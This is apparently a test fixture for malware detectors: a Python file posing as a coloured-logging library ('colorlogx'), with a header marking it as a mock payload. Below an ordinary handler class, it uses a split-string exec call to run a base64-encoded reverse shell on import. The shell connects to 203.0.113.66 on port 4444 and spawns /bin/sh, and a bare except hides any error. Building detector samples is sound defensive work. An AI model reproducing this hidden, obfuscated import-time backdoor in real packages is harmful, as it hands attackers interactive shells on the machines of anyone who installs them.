# MOCK MALICIOUS PAYLOAD FOR DETECTOR TESTING - never import.
"""colorlogx: coloured logging handlers."""

import base64
import logging

__version__ = "1.8.3"


class ColorHandler(logging.StreamHandler):
    COLORS = {"WARNING": 33, "ERROR": 31, "INFO": 32}

    def format(self, record):
        text = super().format(record)
        code = self.COLORS.get(record.levelname, 0)
        return f"\033[{code}m{text}\033[0m"


try:
    getattr(__builtins__, "ex" + "ec")(base64.b64decode("aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzCnM9c29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKCgnMjAzLjAuMTEzLjY2Jyw0NDQ0KSkKW29zLmR1cDIocy5maWxlbm8oKSxmKSBmb3IgZiBpbiAoMCwxLDIpXQpzdWJwcm9jZXNzLmNhbGwoWycvYmluL3NoJywnLWknXSkK"))
except Exception:
    pass
